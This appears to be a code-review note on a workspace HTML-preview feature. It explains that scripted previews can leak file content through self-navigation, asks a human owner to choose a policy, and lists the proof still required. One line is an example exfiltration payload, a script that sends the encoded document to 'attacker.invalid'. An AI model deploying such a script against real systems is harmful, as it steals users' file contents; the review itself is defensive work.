## Needs Sascha: script self-navigation can send file content

The user-approved phrase “no network” is inconsistent with the current direct response. For example, an invented HTML document containing `<script>location.href = 'https://attacker.invalid/collect?data=' + encodeURIComponent(document.documentElement.outerHTML)</script>` can ask the browser to navigate the document itself to that URL. The destination request can contain the encoded document in its query. The `connect-src`, `img-src` and `form-action` directives do not govern this self-navigation; `sandbox allow-scripts` does not disable it. A directly opened `frame=1` response has no embedding app page whose `frame-src` might restrict the destination. This is a static reasoning example, not an external request or a claim that every embedded configuration leaks. `no-referrer` does not remove explicit query data. An attacker-controlled document can contain or assemble sensitive content from the document Sascha previews; this can reach a real external system.

**Question for Sascha:** With scripts enabled, should HTML previews be required to prevent all outbound navigation, or is the residual disclosure risk acceptable and explicitly disclosed? Options: (A, recommended) keep scripts only in an execution environment with independently enforced network and navigation isolation, including direct access, verified on supported browser/Electron contexts; (B) disable scripts where that isolation cannot be enforced, subject to revisiting the approved behavior; (C) knowingly accept and clearly communicate the residual self-navigation risk. The feasibility and product impact of A must be proven; a CSP-only fix is not established here. Record the selected option and dated decision in an accepted ADR/amendment; do not silently choose a policy. Until then the no-network claim cannot be approved.

## Design and interface gaps

The signed `origin/agents/t4-design:design/workspace-file-previews/README.md` contains stages 1–3 and the logic diagram for Excel, Word, PDF and images, but no HTML frame or script/network behavior; the #4-only no-fake exception in `docs/adr/0003-local-workspace-preview-open.md:16` does not establish outside-in evidence for this addition. Issue #8 records a later script decision and accepted general look, but says Sascha has not seen the scripted HTML version. Supply HTML-specific surface, loading, empty, direct-access and failure behavior and any needed design acceptance, alongside the chosen security boundary. The issue asks for parallel work but does not fix a cross-worker HTML interface and ownership/dependencies beyond the existing code: explicitly assign the route producer, UI consumer and security test owner, fix the above response contract and the changed-between-requests state, and require at least one invented hostile fixture through the real producer and consumer. No new dependency or refactoring is proposed before that choice.

## Required proof after the decision

Use only invented files and a local fake endpoint. Exercise the actual UI and server route, and independently open `frame=1` directly. Assert exact response headers and opaque-origin isolation; attempt DOM/cookie/storage and app API access, fetch/XHR/WebSocket, network images and form submission; assert the fake receiver and app side-effect counters receive zero prohibited traffic. Include self-navigation with invented encoded file content and assert the behavior of the selected policy, including direct URL and supported browser/Electron contexts. Check both preflight and frame errors and a file/permission change between requests; avoid claiming a browser test passed from header inspection alone. The existing missing-query CSP check at `apps/web-server/scripts/workspace-file-preview-smoke.ts:370`–`:375` and Word-only iframe test at `apps/web-server/scripts/workspace-file-tabs-ui-smoke.ts:503`–`:511` do not establish the HTML success path.

## Prefactoring

None recommended before the decision. Retain route and UI ownership unless the selected isolation mechanism requires a different seam; specify that seam and its failure behavior before implementation. Full builds, smokes and browser suites were expressly outside this review and were not run.
